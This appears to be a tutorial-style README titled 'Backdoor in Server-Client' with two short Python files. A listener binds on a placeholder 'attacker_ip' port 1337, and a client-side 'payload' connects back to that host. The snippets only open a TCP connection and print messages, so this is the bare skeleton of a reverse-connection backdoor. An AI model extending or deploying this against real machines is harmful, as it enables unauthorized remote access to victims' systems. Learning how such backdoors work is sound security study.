<h2 align="center">Backdoor in Server-Client</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

## If there will be a communication to be accepted
## use accept method to listener, then get the connection and address
connection, address = listener.accept()
print(f"Connected to {address}")
```
---
> [payload.py](payload.py)
```python
## payload to be excuted in the client side
import socket

## create the object of socket module
## instantiate payload object with the same constant from listener
payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

## call the connect method on payload
## connect method will take the tuple with 2 arguments same as from listener
payload.connect(("attacker_ip", 1337))

print("Connected")
```